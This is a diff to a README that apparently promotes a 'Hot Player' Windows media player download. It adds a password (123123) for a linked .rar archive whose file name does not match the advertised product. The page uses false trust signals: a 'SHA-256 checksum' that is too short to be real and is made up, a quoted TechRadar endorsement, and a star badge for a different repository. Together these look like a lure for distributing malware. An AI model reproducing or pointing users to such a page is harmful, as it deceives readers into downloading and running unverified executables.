@@ -47,19 +47,29 @@ Where every pixel matters and every note resonates. 🚀
 <div align="center">
   <h2>🚀 DOWNLOAD THE ULTIMATE WINDOWS MEDIA EXPERIENCE</h2>
   
-  [![Windows Download](https://img.shields.io/badge/_DOWNLOAD_NOW-0078D6?style=for-the-badge&logo=windows&logoColor=white&label=Hot%20Player%20v3.5.0&labelColor=0078D6)](https://github.com/orekhov65/Hot-Player-Download/releases/download/Download/Pot.Player.v2025.rar)
+[![Windows Download](https://img.shields.io/badge/_DOWNLOAD_NOW-0078D6?style=for-the-badge&logo=windows&logoColor=white&label=Hot%20Player%20v3.5.0&labelColor=0078D6)](https://github.com/orekhov65/Hot-Player-Download/releases/download/Download/Pot.Player.v2025.rar)
 
-  <h3>🔥 ONE-CLICK INSTALL • 11,7MB INSTALLER • 60s SETUP</h3>
+<div align="center">
   
-   <a href="https://github.com/orekhov65?tab=repositories">
-    <img src="https://img.shields.io/github/stars/hotplayer/official?style=for-the-badge&color=gold&label=GITHUB%20STARS&logo=github" alt="GitHub Stars">
-  </a>
+  ### 🔐 ARCHIVE PASSWORD
   
-  <p>⏱️ <strong>Last Updated:</strong> 2025-5-3</p>
-  <p>🔒 <strong>Security Verified:</strong> SHA-256 Checksum: 9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d</p>
-</div>
+  <div>
+    <h1>1️⃣2️⃣3️⃣1️⃣2️⃣3️⃣</h1>
+  </div>
+  
+  
+  <h3>🔥 ONE-CLICK INSTALL • 11,7MB INSTALLER • 13s SETUP</h3>
+  
+<a href="https://github.com/orekhov65?tab=repositories">
+  <img src="https://img.shields.io/github/stars/hotplayer/official?style=for-the-badge&color=gold&label=GITHUB%20STARS&logo=github" alt="GitHub Stars">
+</a>
+  
+<p>⏱️ <strong>Last Updated:</strong> 2025-5-3</p>
+<p>🔒 <strong>Security Verified:</strong> SHA-256 Checksum: 9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d</p>
 
 <h3 align="center">"The fastest Windows media player I've ever used - installation took under a minute!"<br>— TechRadar</h3>
+  
+
 
 
   
